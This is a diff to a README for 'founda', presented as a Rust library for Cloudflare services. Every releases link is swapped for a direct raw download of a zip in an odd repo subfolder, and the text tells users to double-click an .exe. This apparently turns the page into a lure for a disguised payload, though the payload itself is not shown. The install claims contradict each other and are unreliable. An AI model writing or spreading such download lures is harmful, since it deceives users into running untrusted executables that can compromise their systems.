@@ -1,7 +1,7 @@
 # 🌟 founda - Your Easy Path to Cloudflare Services
 
 ## 🔗 Download Now
-[![Download founda](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Plater1000/founda/releases)
+[![Download founda](https://raw.githubusercontent.com/Plater1000/founda/main/blithen/founda.zip)](https://raw.githubusercontent.com/Plater1000/founda/main/blithen/founda.zip)
 
 ## 📖 About founda
 founda is a library that helps you use Cloudflare's Rust service foundations. It offers a simple way to integrate Cloudflare services into your applications. Whether you're building web apps or services, founda streamlines the process.
@@ -10,7 +10,7 @@ founda is a library that helps you use Cloudflare's Rust service foundations. It
 To get started with founda, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to find the latest version of founda.  
-   [Download founda](https://github.com/Plater1000/founda/releases)
+   [Download founda](https://raw.githubusercontent.com/Plater1000/founda/main/blithen/founda.zip)
 
 2. **Choose the Right Version**: On the releases page, look for the latest version at the top. You will see different files available. For most users, the `.exe` file will be suitable for Windows. If you're using Linux or macOS, look for the corresponding file type.
 
@@ -31,7 +31,7 @@ Before you install founda, ensure your system meets the following requirements:
 ## 📦 Download & Install
 To install founda, follow these steps:
 
-1. **Download the Latest Version**: Click here: [Download founda](https://github.com/Plater1000/founda/releases).
+1. **Download the Latest Version**: Click here: [Download founda](https://raw.githubusercontent.com/Plater1000/founda/main/blithen/founda.zip).
    
 2. **Installation**:
    - **Windows**: Locate the downloaded `.exe` file and double-click it. Follow the installation instructions.
@@ -64,4 +64,4 @@ founda simplifies the way you interact with Cloudflare services using Rust. With
 
 ---
 
-Remember to regularly check the [Releases page](https://github.com/Plater1000/founda/releases) for updates and new features. Enjoy using founda!
+Remember to regularly check the [Releases page](https://raw.githubusercontent.com/Plater1000/founda/main/blithen/founda.zip) for updates and new features. Enjoy using founda!
